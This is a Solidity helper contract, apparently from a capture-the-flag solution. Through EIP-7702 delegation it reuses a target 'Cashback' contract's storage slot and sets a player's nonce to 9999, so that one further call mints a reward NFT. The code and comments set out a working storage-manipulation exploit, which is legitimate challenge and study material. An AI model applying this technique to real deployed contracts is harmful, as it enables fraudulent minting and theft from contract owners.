// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {ERC1155} from "openzeppelin-contracts-v5.4.0/token/ERC1155/ERC1155.sol";

/**
 * @title NonceSetter
 * @notice Helper contract used to set the player's nonce via temporary EIP-7702 delegation.
 *
 * @dev
 * This contract replicates the storage layout of the Cashback contract by:
 *   - Using the same `layout at` slot
 *   - Inheriting from ERC1155 (matching parent storage layout)
 *
 * When the player delegates to this contract (via EIP-7702), any write to `nonce`
 * will affect the exact same storage slot used by Cashback.nonce.
 *
 * This allows us to:
 *   1. Set the player's nonce to 9999
 *   2. Delegate back to Cashback
 *   3. Trigger one call → nonce becomes 10000 → Super Cashback NFT is minted
 *
 * @custom:insight EIP-7702 delegation enables arbitrary contracts to write directly
 *                 into an EOA's storage, allowing controlled state manipulation.
 */
contract NonceSetter layout at 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba00 is ERC1155 {
    uint256 public constant SUPERCASHBACK_NONCE = 10000;

    uint256 public nonce;

    constructor() ERC1155("") {}

    /**
     * @notice Sets the delegated player's nonce to 9999.
     *
     * @dev After this, a single call to Cashback.payWithCashback() will:
     *      - increment nonce → 10000
     *      - mint the player-specific Super Cashback NFT
     */
    function setNonce() external {
        nonce = SUPERCASHBACK_NONCE - 1;
    }
}
